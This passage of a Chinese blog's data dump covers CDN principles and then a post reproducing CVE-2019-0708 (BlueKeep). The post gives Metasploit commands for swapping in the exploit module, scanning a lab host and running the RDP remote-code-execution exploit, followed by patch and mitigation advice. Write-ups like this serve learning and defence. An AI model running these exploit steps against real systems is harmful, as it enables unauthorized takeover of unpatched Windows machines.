href=\"#除网站加速外-还有其他作用\" class=\"headerlink\" title=\"除网站加速外,还有其他作用\"></a>除网站加速外,还有其他作用</h2><ul>\n<li>实现跨运营商、跨地域的全网覆盖</li>\n</ul>\n<p>互联不互通、区域ISP地域局限、出口带宽受限制等种种因素都造成了网站的区域性无法访问.CDN加速可以覆盖全球的线路,通过和运营商合作,部署IDC资源,在全国骨干节点商,合理部署CDN边缘分发存储节点,充分利用带宽资源,平衡源站流量.阿里云在国内有500+节点,海外300+节点,覆盖主流国家和地区不是问题,可以确保CDN服务的稳定和快速.</p>\n<ul>\n<li>保障网站安全性</li>\n</ul>\n<p>CDN的负载均衡和分布式存储技术,可以加强网站的可靠性,相当无无形中给你的网站添加了一把保护伞,应对绝大部分的互联网攻击事件;防御系统也能避免网站遭到恶意攻击.</p>\n<ul>\n<li>异地备援</li>\n</ul>\n<p>当某个服务器发生意外故障时,系统将会调用其他临近的健康服务器节点进行服务,进而提供接近100%的可靠性,这就让你的网站可以做到永不宕机.</p>\n<ul>\n<li>节约成本</li>\n</ul>\n<p>投入使用CDN加速可以实现网站的全国铺设,你根据不用考虑购买服务器与后续的托管运维,服务器之间镜像同步,也不用为了管理维护技术人员而烦恼,节省了人力、精力和财力.</p>\n<ul>\n<li>让你更专注业务本身</li>\n</ul>\n<p>CDN加速厂商一般都会提供一站式服务,业务不仅限于CDN,还有配套的云存储、大数据服务、视频云服务等,而且一般会提供7x24运维监控支持,保证网络随时畅通,你可以放心使用.并且将更多的精力投入到发展自身的核心业务之上.</p>\n<p><img src=\"/images/cdn/image-20200606144540270.png\"></p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\" 原理\"></a> 原理</h2><p><img src=\"/images/cdn/image-20200606150157143.png\"></p>\n<h3 id=\"通过域名解析IP分析\"><a href=\"#通过域名解析IP分析\" class=\"headerlink\" title=\"通过域名解析IP分析\"></a>通过域名解析IP分析</h3><p><img src=\"/images/cdn/image-20200606160916110.png\"></p>\n<ol>\n<li>当用户请求URL,经过本地DNS系统解析，DNS 系统会最终将域名的解析权交给 <a href=\"http://en.wikipedia.org/wiki/CNAME_record\">CNAME</a> 指向的 CDN 专用 DNS 服务器.</li>\n<li>CDN 的 DNS 服务器将 CDN 的全局负载均衡设备 IP 地址返回用户.</li>\n<li>用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求.</li>\n<li>CDN 全局负载均衡设备根据用户 IP 地址,以及用户请求的内容URL,选择一台用户所属区域的区域负载均衡设备,告诉用户向这台设备发起请求.</li>\n<li>基于以下这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的IP地址.</li>\n<li>根据用户 IP 地址，判断哪一台服务器距用户最近.</li>\n<li>根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容.</li>\n<li>查询各个服务器当前的负载情况,判断哪一台服务器尚有服务能力.</li>\n<li>全局负载均衡设备把服务器的 IP 地址返回给用户</li>\n<li>用户向缓存服务器发起请求,缓存服务器响应用户请求,将用户所需内容传送到用户终端.如果这台缓存服务器上并没有用户想要的内容,而区域均衡设备依然将它分配给了用户,那么这台服务器就要向它的上一级缓存服务器请求内容,直至追溯到网站的源服务器将内容拉到本地.</li>\n</ol>\n<p>DNS 服务器根据用户 IP 地址,将域名解析成相应节点的缓存服务器IP地址,实现用户就近访问.使用 CDN 服务的网站,只需将其域名解析权交给 CDN 的全局负载均衡（GSLB）设备,将需要分发的内容注入 CDN,就可以实现内容加速了.</p>\n<h1 id=\"常用CDN软件\"><a href=\"#常用CDN软件\" class=\"headerlink\" title=\"常用CDN软件\"></a>常用CDN软件</h1><ul>\n<li>Varnish ：可以认为是内存缓存,速度一流,但是内存缓存也限制了其容量,缓存页面和图片一般是挺好的.</li>\n<li>Squid：功能最全且比较传统的Web cache server,有自己的存储引擎.但是架构太老,性能一般.</li>\n<li>nginx：本来是反向代理/web服务器,用了插件可以做这个副业,但是本身不支持的功能比较多(Nginx功能其实还有很多可以学习).</li>\n<li>apache traffic server(ATS)：很多单位都在使用,未来趋势.<h2 id=\"各厂家使用情况\"><a href=\"#各厂家使用情况\" class=\"headerlink\" title=\"各厂家使用情况\"></a>各厂家使用情况</h2></li>\n<li>网宿：使用ATS，按照网宿的规模应该是有能力进行二次开发。</li>\n<li>蓝汛：早期是squid，当其余厂商拥抱ATS时，由于技术包袱未及时投入ATS，但目前也在使用ATS</li>\n<li>小米、京东等主要使用ATS</li>\n<li>腾讯：使用ATS</li>\n<li>百度：nginx + 自研缓存</li>\n<li>阿里：tengine + 自研swift，早起使用ATS，但由于某些原因放弃ATS使用自研，不过自研可能是C开发，应该是参考哪款开源软件，比如文件系统借鉴的是squid的文件系统。</li>\n<li>又拍云：之前使用ATS，最新的消息是自研BearCache，应该不是全量部署，从文章来看猜测是优化了网络框架和热重启架构，应该也是参考ATS等。</li>\n<li>新浪：Nginx + ncache，需要第三方模块并且插件化开发，性能损失比较大</li>\n</ul>\n<h1 id=\"适用场景\"><a href=\"#适用场景\" class=\"headerlink\" title=\"适用场景\"></a>适用场景</h1><ul>\n<li>应用加速</li>\n</ul>\n<p>静态内容加速，如：html image js css 等</p>\n<ul>\n<li>大文件下载分发加速</li>\n</ul>\n<p>基于视屏、MP4等大文件加速</p>\n<ul>\n<li>视频直播加速</li>\n</ul>\n<p>视频直播加速，流媒体切片、转码、码流转换等等</p>\n<ul>\n<li>移动应用加速</li>\n</ul>\n<p>移动APP更新文件（apk文件）分发,移动APP内图片、页面、短视频、UGC等内容的优化加速分发.</p>\n<ul>\n<li>抵抗DDoS</li>\n</ul>\n<p>CDN提供了大型分布式服务器基础结构来吸收攻击量.</p>\n<h1 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\" 扩展\"></a> 扩展</h1><h3 id=\"流量劫持\"><a href=\"#流量劫持\" class=\"headerlink\" title=\"流量劫持\"></a>流量劫持</h3><p>CDN本身就是一种DNS劫持,只不过是良性的. 不同于黑客强制DNS把域名解析到自己的钓鱼IP上,CDN则是让DNS主动配合,把域名解析到临近的服务器上.</p>\n<h3 id=\"劫持分类\"><a href=\"#劫持分类\" class=\"headerlink\" title=\"劫持分类\"></a>劫持分类</h3><ul>\n<li>域名劫持：又称DNS劫持,通常是指域名指向到非正常IP（恶意IP）,该恶意IP通过反向代理的方式,在能返回网页正常内容的情况,可能插入恶意代码、监听网民访问、劫持敏感信息等操作.通常验证一个域名是否被劫持的方法是PING一个域名,如果发现PING出来的IP不是您的服务器真实IP,则可以确定被劫持了（当然如果使用了云安全等安全加速平台,得到的IP为平台IP,并非劫持这里需要知道）.</li>\n<li>数据劫持：通常由电信运营商中某些员工等勾结犯罪分子,在公网中进行的数据支持插入,此类情况极隐蔽，不会改变用户域名解析IP,而是直接数据流经运营商宽带时在网页中挺入内容,此类情况,建议网页启用HTTPS加密,可以解决这一问题（<code>通信是加密的,运营商无法插入恶意内容</code>）.</li>\n</ul>\n<h3 id=\"高防、流量清洗\"><a href=\"#高防、流量清洗\" class=\"headerlink\" title=\"高防、流量清洗\"></a>高防、流量清洗</h3><p>CDN 可以通过分流 ,清洗掉恶意DDSS大部分的攻击流量.</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;113037678</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n"},{"title":"CVE-2019-0708复现","date":"2019-09-07T03:15:29.000Z","_content":"2019年9月7日凌晨,metasploit官方发布CVE-2019-0708漏洞利用代码,该EXP可以通过RDP协议进行远程代码执行攻击.官方描述此漏洞相关危害可参考2017年WannaCry事件,强烈建议用户及时安装补丁以避免受到损失.\n\n## 漏洞始末\n\n### 漏洞原理\n\nCVE-2019-0708(远程代码执行漏洞),当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时,即可以触发该漏洞.此漏洞属于预身份验证,无需用户交互,成功利用此漏洞的攻击者可以安装应用程序,查看、更改或删除数据或创建具有完全用户权限的新账户.\n\n恶意攻击者还很有可能利用该漏洞编写定制的恶意软件,利用此漏洞的恶意软件传播影响都可能与2017年WannaCry恶意软件遍布全球的事件类似,由于EXP的公开发布,需要广大用户更加警惕利用该漏洞的恶意软件的出现,提前做好预防措施.\n\n### 漏洞时间\n\n2019-5-14 Microsoft发布安全更新公告并披露漏洞.\n\n2019-9-7 EXP发布并复现验证,证实该EXP可导致服务器远程代码执行,特再次发布预警,提供解决方案给广大企业用户.\n\n### 影响范围\n\n目前受影响的Windows版本:\nMicrosoft Windows XP\nMicrosoft Windows Server 2008 R2 for x64-based Systems SP1\nMicrosoft Windows Server 2008 R2 for Itanium-based Systems SP1\nMicrosoft Windows Server 2008 for x64-based Systems SP2\nMicrosoft Windows Server 2008 for Itanium-based Systems SP2\nMicrosoft Windows Server 2008 for 32-bit Systems SP2\nMicrosoft Windows Server 2003\nMicrosoft Windows 7 for x64-based Systems SP1\nMicrosoft Windows 7 for 32-bit Systems SP1\n\n### 漏洞类型\n\n远程代码执行\n\n## 漏洞验证\n\n### 环境准备\n\nMetasploit\n[EXP对应脚本](http://www.si1ent.xyz/Tools/CVE-2019-0708MSF.zip)\nWindows 7 x64 旗舰版6.1.7601 Service Pack 1 Build 7601\n\n### 实操\n\n#### Metasploit模块重载\n\n该EXP被发布者在Metasploit的官方Github的Pull Request中,但尚未加载进Metasploit的官方框架中. 所以下载EXP对应脚本并进行替换！！！！！直接替换！！！\n\nmsf对应位置:\n\n```BASH\nrdp.rb ----> /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb\n\nrdp_scanner.rb ----> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb\n\ncve_2019_0708_bluekeep.rb ----> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb\n\ncve_2019_0708_bluekeep_rce.rb ----> /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb\n```\n\n重载模块\n\nmsf5>reload_all\n\n#### 漏洞检测\n\n```bash\nmsf5>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\nmsf5>set RHOSTS 172.16.144.142\nmsf5>run\n```\n\n![](/images/cve0708/cve_check.jpg)\n\n#### 漏洞利用\n\n```bash\nuse exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS 172.16.144.142\nset target 3(target根据自己系统版本设定)\nrun\n```\n\n![](/images/cve0708/cve_attack.jpg)\n\n#### 可能存在问题\n\n\\* set target 1 - bluescreen(可能出现蓝屏重启)\n\\* set target 3 - success\n如果出现下图:\n\n![](/images/cve0708/cve1.jpg)\n\n尝试设置: set ForceExploit true\n\n## 漏洞加固\n\n#### 及时进行补丁更新\n\nMicrosoft在2019年5月14日修复了该漏洞\n[补丁下载地址](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)\n以及为已不受微软更新支持的系统(Windows Server 2003和Windows XP)提供的安全更新\n[补丁下载地址]( https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708)\n\n#### 缓解措施\n\n在无法及时安装微软安全更新的情况下作为临时性解决方案\n\n- 若用户不需要用到远程桌面服务,建议禁用该服务.\n- 开启网络级别身份验证(NLA),此方案适用于Windows 7, Windows Server 2008, Windows Server 2008 R2 以上缓解措施只能暂时性针对该漏洞对系统进行部分缓解,强烈建议在条件允许的情况下及时安装微软安全更新.\n\n## 参考\n\n```php+HTML\nhttps://github.com/rapid7/metasploit-framework/pull/12283?from=timeline&isappinstalled=0\nhttps://mp.weixin.qq.com/s/Mf5TuATyyU7-W2VDHCRKnA\n```\n\n","source":"_posts/CVE-2019-0708复现.md","raw":"---\ntitle: CVE-2019-0708复现\ndate: 2019-09-07 11:15:29\ntag:\n\t- CVE-2019-0708\n---\n2019年9月7日凌晨,metasploit官方发布CVE-2019-0708漏洞利用代码,该EXP可以通过RDP协议进行远程代码执行攻击.官方描述此漏洞相关危害可参考2017年WannaCry事件,强烈建议用户及时安装补丁以避免受到损失.\n\n## 漏洞始末\n\n### 漏洞原理\n\nCVE-2019-0708(远程代码执行漏洞),当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时,即可以触发该漏洞.此漏洞属于预身份验证,无需用户交互,成功利用此漏洞的攻击者可以安装应用程序,查看、更改或删除数据或创建具有完全用户权限的新账户.\n\n恶意攻击者还很有可能利用该漏洞编写定制的恶意软件,利用此漏洞的恶意软件传播影响都可能与2017年WannaCry恶意软件遍布全球的事件类似,由于EXP的公开发布,需要广大用户更加警惕利用该漏洞的恶意软件的出现,提前做好预防措施.\n\n### 漏洞时间\n\n2019-5-14 Microsoft发布安全更新公告并披露漏洞.\n\n2019-9-7 EXP发布并复现验证,证实该EXP可导致服务器远程代码执行,特再次发布预警,提供解决方案给广大企业用户.\n\n### 影响范围\n\n目前受影响的Windows版本:\nMicrosoft Windows XP\nMicrosoft Windows Server 2008 R2 for x64-based Systems SP1\nMicrosoft Windows Server 2008 R2 for Itanium-based Systems SP1\nMicrosoft Windows Server 2008 for x64-based Systems SP2\nMicrosoft Windows Server 2008 for Itanium-based Systems SP2\nMicrosoft Windows Server 2008 for 32-bit Systems SP2\nMicrosoft Windows Server 2003\nMicrosoft Windows 7 for x64-based Systems SP1\nMicrosoft Windows 7 for 32-bit Systems SP1\n\n### 漏洞类型\n\n远程代码执行\n\n## 漏洞验证\n\n### 环境准备\n\nMetasploit\n[EXP对应脚本](http://www.si1ent.xyz/Tools/CVE-2019-0708MSF.zip)\nWindows 7 x64 旗舰版6.1.7601 Service Pack 1 Build 7601\n\n### 实操\n\n#### Metasploit模块重载\n\n该EXP被发布者在Metasploit的官方Github的Pull Request中,但尚未加载进Metasploit的官方框架中. 所以下载EXP对应脚本并进行替换！！！！！直接替换！！！\n\nmsf对应位置:\n\n```BASH\nrdp.rb ----> /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb\n\nrdp_scanner.rb ----> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb\n\ncve_2019_0708_bluekeep.rb ----> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb\n\ncve_2019_0708_bluekeep_rce.rb ----> /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb\n```\n\n重载模块\n\nmsf5>reload_all\n\n#### 漏洞检测\n\n```bash\nmsf5>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\nmsf5>set RHOSTS 172.16.144.142\nmsf5>run\n```\n\n![](/images/cve0708/cve_check.jpg)\n\n#### 漏洞利用\n\n```bash\nuse exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS 172.16.144.142\nset target 3(target根据自己系统版本设定)\nrun\n```\n\n![](/images/cve0708/cve_attack.jpg)\n\n#### 可能存在问题\n\n\\* set target 1 - bluescreen(可能出现蓝屏重启)\n\\* set target 3 - success\n如果出现下图:\n\n![](/images/cve0708/cve1.jpg)\n\n尝试设置: set ForceExploit true\n\n## 漏洞加固\n\n#### 及时进行补丁更新\n\nMicrosoft在2019年5月14日修复了该漏洞\n[补丁下载地址](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)\n以及为已不受微软更新支持的系统(Windows Server 2003和Windows XP)提供的安全更新\n[补丁下载地址]( https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708)\n\n#### 缓解措施\n\n在无法及时安装微软安全更新的情况下作为临时性解决方案\n\n- 若用户不需要用到远程桌面服务,建议禁用该服务.\n- 开启网络级别身份验证(NLA),此方案适用于Windows 7, Windows Server 2008, Windows Server 2008 R2 以上缓解措施只能暂时性针对该漏洞对系统进行部分缓解,强烈建议在条件允许的情况下及时安装微软安全更新.\n\n## 参考\n\n```php+HTML\nhttps://github.com/rapid7/metasploit-framework/pull/12283?from=timeline&isappinstalled=0\nhttps://mp.weixin.qq.com/s/Mf5TuATyyU7-W2VDHCRKnA\n```\n\n","slug":"CVE-2019-0708复现","published":1,"updated":"2020-10-23T03:34:11.437Z","_id":"ckglobhdf0004b1hqhxahdeve","comments":1,"layout":"post","photos":[],"link":"","content":"<p>2019年9月7日凌晨,metasploit官方发布CVE-2019-0708漏洞利用代码,该EXP可以通过RDP协议进行远程代码执行攻击.官方描述此漏洞相关危害可参考2017年WannaCry事件,强烈建议用户及时安装补丁以避免受到损失.</p>\n<h2 id=\"漏洞始末\"><a href=\"#漏洞始末\" class=\"headerlink\" title=\"漏洞始末\"></a>漏洞始末</h2><h3 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>CVE-2019-0708(远程代码执行漏洞),当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时,即可以触发该漏洞.此漏洞属于预身份验证,无需用户交互,成功利用此漏洞的攻击者可以安装应用程序,查看、更改或删除数据或创建具有完全用户权限的新账户.</p>\n<p>恶意攻击者还很有可能利用该漏洞编写定制的恶意软件,利用此漏洞的恶意软件传播影响都可能与2017年WannaCry恶意软件遍布全球的事件类似,由于EXP的公开发布,需要广大用户更加警惕利用该漏洞的恶意软件的出现,提前做好预防措施.</p>\n<h3 id=\"漏洞时间\"><a href=\"#漏洞时间\" class=\"headerlink\" title=\"漏洞时间\"></a>漏洞时间</h3><p>2019-5-14 Microsoft发布安全更新公告并披露漏洞.</p>\n<p>2019-9-7 EXP发布并复现验证,证实该EXP可导致服务器远程代码执行,特再次发布预警,提供解决方案给广大企业用户.</p>\n<h3 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h3><p>目前受影响的Windows版本:<br>Microsoft Windows XP<br>Microsoft Windows Server 2008 R2 for x64-based Systems SP1<br>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1<br>Microsoft Windows Server 2008 for x64-based Systems SP2<br>Microsoft Windows Server 2008 for Itanium-based Systems SP2<br>Microsoft Windows Server 2008 for 32-bit Systems SP2<br>Microsoft Windows Server 2003<br>Microsoft Windows 7 for x64-based Systems SP1<br>Microsoft Windows 7 for 32-bit Systems SP1</p>\n<h3 id=\"漏洞类型\"><a href=\"#漏洞类型\" class=\"headerlink\" title=\"漏洞类型\"></a>漏洞类型</h3><p>远程代码执行</p>\n<h2 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h2><h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p>Metasploit<br><a href=\"http://www.si1ent.xyz/Tools/CVE-2019-0708MSF.zip\">EXP对应脚本</a><br>Windows 7 x64 旗舰版6.1.7601 Service Pack 1 Build 7601</p>\n<h3 id=\"实操\"><a href=\"#实操\" class=\"headerlink\" title=\"实操\"></a>实操</h3><h4 id=\"Metasploit模块重载\"><a href=\"#Metasploit模块重载\" class=\"headerlink\" title=\"Metasploit模块重载\"></a>Metasploit模块重载</h4><p>该EXP被发布者在Metasploit的官方Github的Pull Request中,但尚未加载进Metasploit的官方框架中. 所以下载EXP对应脚本并进行替换！！！！！直接替换！！！</p>\n<p>msf对应位置:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rdp.rb ----&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class=\"line\"></span><br><span class=\"line\">rdp_scanner.rb ----&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class=\"line\"></span><br><span class=\"line\">cve_2019_0708_bluekeep.rb ----&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class=\"line\"></span><br><span class=\"line\">cve_2019_0708_bluekeep_rce.rb ----&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>\n\n<p>重载模块</p>\n<p>msf5&gt;reload_all</p>\n<h4 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5&gt;use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class=\"line\">msf5&gt;<span class=\"built_in\">set</span> RHOSTS 172.16.144.142</span><br><span class=\"line\">msf5&gt;run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/cve0708/cve_check.jpg\"></p>\n<h4 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class=\"line\"><span class=\"built_in\">set</span> RHOSTS 172.16.144.142</span><br><span class=\"line\"><span class=\"built_in\">set</span> target 3(target根据自己系统版本设定)</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/cve0708/cve_attack.jpg\"></p>\n<h4 id=\"可能存在问题\"><a href=\"#可能存在问题\" class=\"headerlink\" title=\"可能存在问题\"></a>可能存在问题</h4><p>* set target 1 - bluescreen(可能出现蓝屏重启)<br>* set target 3 - success<br>如果出现下图:</p>\n<p><img src=\"/images/cve0708/cve1.jpg\"></p>\n<p>尝试设置: set ForceExploit true</p>\n<h2 id=\"漏洞加固\"><a href=\"#漏洞加固\" class=\"headerlink\" title=\"漏洞加固\"></a>漏洞加固</h2><h4 id=\"及时进行补丁更新\"><a href=\"#及时进行补丁更新\" class=\"headerlink\" title=\"及时进行补丁更新\"></a>及时进行补丁更新</h4><p>Microsoft在2019年5月14日修复了该漏洞<br><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708\">补丁下载地址</a><br>以及为已不受微软更新支持的系统(Windows Server 2003和Windows XP)提供的安全更新<br><a href=\"https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708\">补丁下载地址</a></p>\n<h4 id=\"缓解措施\"><a href=\"#缓解措施\" class=\"headerlink\" title=\"缓解措施\"></a>缓解措施</h4><p>在无法及时安装微软安全更新的情况下作为临时性解决方案</p>\n<ul>\n<li>若用户不需要用到远程桌面服务,建议禁用该服务.</li>\n<li>开启网络级别身份验证(NLA),此方案适用于Windows 7, Windows Server 2008, Windows Server 2008 R2 以上缓解措施只能暂时性针对该漏洞对系统进行部分缓解,强烈建议在条件允许的情况下及时安装微软安全更新.</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;pull&#x2F;12283?from&#x3D;timeline&amp;isappinstalled&#x3D;0</span><br><span class=\"line\">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;Mf5TuATyyU7-W2VDHCRKnA</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>2019年9月7日凌晨,metasploit官方发布CVE-2019-0708漏洞利用代码,该EXP可以通过RDP协议进行远程代码执行攻击.官方描述此漏洞相关危害可参考2017年WannaCry事件,强烈建议用户及时安装补丁以避免受到损失.</p>\n<h2 id=\"漏洞始末\"><a href=\"#漏洞始末\" class=\"headerlink\" title=\"漏洞始末\"></a>漏洞始末</h2><h3 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>CVE-2019-0708(远程代码执行漏洞),当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时,即可以触发该漏洞.此漏洞属于预身份验证,无需用户交互,成功利用此漏洞的攻击者可以安装应用程序,查看、更改或删除数据或创建具有完全用户权限的新账户.</p>\n<p>恶意攻击者还很有可能利用该漏洞编写定制的恶意软件,利用此漏洞的恶意软件传播影响都可能与2017年WannaCry恶意软件遍布全球的事件类似,由于EXP的公开发布,需要广大用户更加警惕利用该漏洞的恶意软件的出现,提前做好预防措施.</p>\n<h3 id=\"漏洞时间\"><a href=\"#漏洞时间\" class=\"headerlink\" title=\"漏洞时间\"></a>漏洞时间</h3><p>2019-5-14 Microsoft发布安全更新公告并披露漏洞.</p>\n<p>2019-9-7 EXP发布并复现验证,证实该EXP可导致服务器远程代码执行,特再次发布预警,提供解决方案给广大企业用户.</p>\n<h3 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h3><p>目前受影响的Windows版本:<br>Microsoft Windows XP<br>Microsoft Windows Server 2008 R2 for x64-based Systems SP1<br>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1<br>Microsoft Windows Server 2008 for x64-based Systems SP2<br>Microsoft Windows Server 2008 for Itanium-based Systems SP2<br>Microsoft Windows Server 2008 for 32-bit Systems SP2<br>Microsoft Windows Server 2003<br>Microsoft Windows 7 for x64-based Systems SP1<br>Microsoft Windows 7 for 32-bit Systems SP1</p>\n<h3 id=\"漏洞类型\"><a href=\"#漏洞类型\" class=\"headerlink\" title=\"漏洞类型\"></a>漏洞类型</h3><p>远程代码执行</p>\n<h2 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h2><h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p>Metasploit<br><a href=\"http://www.si1ent.xyz/Tools/CVE-2019-0708MSF.zip\">EXP对应脚本</a><br>Windows 7 x64 旗舰版6.1.7601 Service Pack 1 Build 7601</p>\n<h3 id=\"实操\"><a href=\"#实操\" class=\"headerlink\" title=\"实操\"></a>实操</h3><h4 id=\"Metasploit模块重载\"><a href=\"#Metasploit模块重载\" class=\"headerlink\" title=\"Metasploit模块重载\"></a>Metasploit模块重载</h4><p>该EXP被发布者在Metasploit的官方Github的Pull Request中,但尚未加载进Metasploit的官方框架中. 所以下载EXP对应脚本并进行替换！！！！！直接替换！！！</p>\n<p>msf对应位置:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rdp.rb ----&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class=\"line\"></span><br><span class=\"line\">rdp_scanner.rb ----&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class=\"line\"></span><br><span class=\"line\">cve_2019_0708_bluekeep.rb ----&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class=\"line\"></span><br><span class=\"line\">cve_2019_0708_bluekeep_rce.rb ----&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>\n\n<p>重载模块</p>\n<p>msf5&gt;reload_all</p>\n<h4 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5&gt;use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class=\"line\">msf5&gt;<span class=\"built_in\">set</span> RHOSTS 172.16.144.142</span><br><span class=\"line\">msf5&gt;run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/cve0708/cve_check.jpg\"></p>\n<h4 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class=\"line\"><span class=\"built_in\">set</span> RHOSTS 172.16.144.142</span><br><span class=\"line\"><span class=\"built_in\">set</span> target 3(target根据自己系统版本设定)</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/cve0708/cve_attack.jpg\"></p>\n<h4 id=\"可能存在问题\"><a href=\"#可能存在问题\" 